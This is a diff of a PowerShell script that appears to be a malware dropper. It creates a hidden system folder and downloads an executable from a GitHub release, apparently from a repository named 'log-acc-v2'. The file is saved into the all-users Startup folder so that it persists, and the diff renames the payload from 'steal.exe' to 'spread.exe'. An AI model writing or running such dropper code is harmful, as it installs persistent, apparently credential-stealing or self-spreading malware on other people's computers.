@@ -44,8 +44,8 @@ $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersS
 New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
 
-$url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/Built.exe"
-$output = "$startupfolder\steal.exe"
+$url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/spread.exe"
+$output = "$startupfolder\spread.exe"
 
 if (Test-Path -Path $output) {
     Write-Host "hello"
